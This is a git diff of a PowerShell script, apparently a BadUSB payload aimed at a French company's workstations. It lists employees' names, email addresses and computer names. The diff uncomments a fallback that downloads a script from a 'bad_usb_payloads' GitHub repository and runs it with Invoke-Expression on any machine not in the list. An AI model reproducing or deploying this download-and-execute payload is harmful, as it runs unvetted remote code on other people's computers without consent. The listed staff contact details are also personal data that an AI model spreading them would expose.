@@ -4,7 +4,7 @@ Add-Type -AssemblyName System.Windows.Forms
 $people = @()
 
 $people += [PSCustomObject]@{ Name = "Christophe"; Email = "support-si@garnier-durand.fr"; Computer = "STP011" }
-$people += [PSCustomObject]@{ Name = "Bernardino"; Email = "logistique@garnier-durand.fr"; Computer = "PC-Logistique-GD" }
+$people += [PSCustomObject]@{ Name = "Bernardino"; Email = "logistique@garnier-durand.fr"; Computer = "PC-Logistique-G" }
 $people += [PSCustomObject]@{ Name = "Lilou"; Email = "rh@garnier-durand.fr"; Computer = "STF-27" }
 $people += [PSCustomObject]@{ Name = "Murielle"; Email = "m.bonnin@garnier-durand.fr"; Computer = "PC-ACHATS" }
 $people += [PSCustomObject]@{ Name = "Pascal"; Email = "p.trouve@garnier-durand.fr"; Computer = "STP008" }
@@ -20,10 +20,10 @@ $computerName = $env:COMPUTERNAME
 $target = $people | Where-Object { $_.Computer -eq $computerName }
 
 # Si la personne n'a pas été trouvée, fallback sur le script ScreenLockPolice
-<# if ($null -eq $target) {
+if ($null -eq $target) {
     Invoke-Expression (Invoke-WebRequest 'https://raw.githubusercontent.com/MagikarpLv13/bad_usb_payloads/master/ScreenLockPolice/script.ps1')
     exit
-} #>
+}
 
 # Actualiser la liste des personnes
 $people = $people | Where-Object { $_.Computer -ne $computerName }
